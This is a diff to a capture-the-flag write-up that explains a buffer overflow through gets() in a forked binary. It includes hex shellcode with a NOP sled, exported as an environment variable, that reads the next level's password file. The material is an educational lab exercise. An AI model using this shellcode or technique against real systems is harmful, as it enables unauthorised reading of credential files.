@@ -25,12 +25,12 @@ You can setup requirements with the script: [scripts/installUtils.sh](../../scri
 
 See our assembly interpretation in [source file](../source.c)
 
-So first of all, we notice that we have a fork and then we execute `gets` wich is vulnerable. After trying a buffer overflow to execute a shellcode with `execve("/bin/sh")` the program terminates with the message `no exec() for you`.
+So first of all, we notice that we have a fork and then we execute `gets` wich is vulnerable. After trying a buffer overflow to execute a shellcode with `execve("/bin/sh")` the program terminates with `SIGHUP`.
 
 Indeed after some reflexions, we notice that after the fork, the parent process doesn't allow the child process to execute `execve` command :
 `execve` command called by child process sends a `SIGTRAP` signal, which lets the control back to the parent process who kills the child procress and stops the program.
 
-So the exploit would be to give it something else than `execve("/bin/sh")` => why not trying a shellcode who read/open the file `/home/users/level05/.pass` ?
+So the exploit would be to give it something else than `execve("/bin/sh")` => why not trying a shellcode which read/open the file `/home/users/level05/.pass` ?
 
 First the offset :
 
@@ -50,7 +50,9 @@ Then the shellcode exported in an environment variable :
 ```shell
 export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'"`
 ```
-So the SHELLCODE = 255 NOPs + shellcode to open/read + the path  
+
+So the SHELLCODE = `255 NOPs + shellcode to open/read + the path`
+
 Now we need this env variable's address and will add 100 to be sure to land into the NOPs of the shellcode :
 
 ```shell
